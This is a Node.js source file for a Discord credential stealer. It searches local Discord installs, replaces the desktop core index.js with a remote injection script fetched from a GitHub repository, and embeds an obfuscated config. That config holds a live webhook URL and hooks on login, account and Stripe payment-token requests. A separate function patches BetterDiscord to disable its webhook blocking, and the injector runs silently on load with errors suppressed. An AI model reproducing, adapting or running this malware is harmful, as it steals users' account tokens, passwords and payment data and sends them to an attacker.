const fs = require("fs");
const fetch = require('node-fetch');
const JsConfuser = require("js-confuser");

let config_obf

JsConfuser.obfuscate('const config = {    "logout": "true",    "logout-notify": "true",    "init-notify": "true",    "embed-color": 16711680, injection_url: "https://raw.githubusercontent.com/Amqterasu/BlazeArchive/main/injection.js",    apiurl: "https://discord.com/api/webhooks/1122962408160362636/ZdMki9G_KQ5TQLaL-I23wedraB2c7ObZ_XLE7LoHkUoEFvGrHgUFXc9c8sPHlpkLJxaC",    Filter: {        urls: [            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",            "https://*.discord.com/api/v*/applications/detectable",            "https://discord.com/api/v*/applications/detectable",            "https://*.discord.com/api/v*/users/@me/library",            "https://discord.com/api/v*/users/@me/library",            "wss://remote-auth-gateway.discord.gg/*",        ],}, onCompleted: {urls: [    "https://discord.com/api/v*/users/@me",    "https://discordapp.com/api/v*/users/@me",    "https://*.discord.com/api/v*/users/@me",    "https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.stripe.com/v*/tokens"]}};',
{
  target: "node",
  preset: "low",
  renameVariables: false,
  renameGlobals: false,
  stringEncoding: true,
}).then(obfuscated => {
    config_obf = obfuscated
})

async function inject() {

    var potentials = [];
    const local = process.env.localappdata;
    const folders = fs.readdirSync(local)

    for (let i = 0; i < folders.length; i++) {
        const folder = folders[i];

        if (folder.includes("iscord")) {
            potentials.push(local + "///" + folder)
        }
    }

    var apps = [];

    for (let i = 0; i < potentials.length; i++) {
        const potential = potentials[i];

        const files = fs.readdirSync(potential + "/")
        for (let u = 0; u < files.length; u++) {
            const file = files[u];

            if (file.includes("app-")) {
                apps.push(potential + "/" + file + "/modules/")
            }
        }
    }

    var desktops = [];

    for (let i = 0; i < apps.length; i++) {
        const app = apps[i];

        if (!fs.existsSync(app)) {
            continue
        }

        const files = fs.readdirSync(app);
        for (let u = 0; u < files.length; u++) {
            const file = files[u];

            if (file.includes("discord_desktop_core-")) {
                desktops.push(app + file + "/discord_desktop_core/")
            }
        }
    }

    for (let i = 0; i < desktops.length; i++) {
        const desktop = desktops[i];

        if (!fs.existsSync(desktop)) {
            continue
        }

        
        try {
            fs.unlinkSync(desktop + "index.js")
            const url1 = 'https://raw.githubusercontent.com/Yxxtsuu/BlazeArchive/main/injection.js'
            const response = await fetch(url1);
            const injection = await response.text();
            await fs.appendFileSync(desktop + "index.js", `${injection}`)
            await fs.writeFileSync(desktop + "index.js", fs.readFileSync(desktop + "index.js").toString().replace("CONFIG_OBF", config_obf));
        } catch (err) { }
    }
}

const replace = (buf, a, b) => {
    if (!Buffer.isBuffer(buf)) buf = Buffer.from(buf);
    const idx = buf.indexOf(a);
    if (idx === -1) return buf;
    if (!Buffer.isBuffer(b)) b = Buffer.from(b);
  
    const before = buf.slice(0, idx);
    const after = replace(buf.slice(idx + a.length), a, b);
    const len = idx + b.length + after.length;
    return Buffer.concat([ before, b, after ], len);
}

function pwnBetterDiscord() {
    let dir = process.env.appdata + "/BetterDiscord/data/betterdiscord.asar"
    if (fs.existsSync(dir)) {
        const boom = fs.readFileSync(dir);
        fs.writeFileSync(dir, replace(boom, "api/webhooks", "stanleyisgod"));
    }

    return;
}
try {
    inject("urwebhook");
} catch (err) { }

module.exports = {
    inject,
    pwnBetterDiscord
}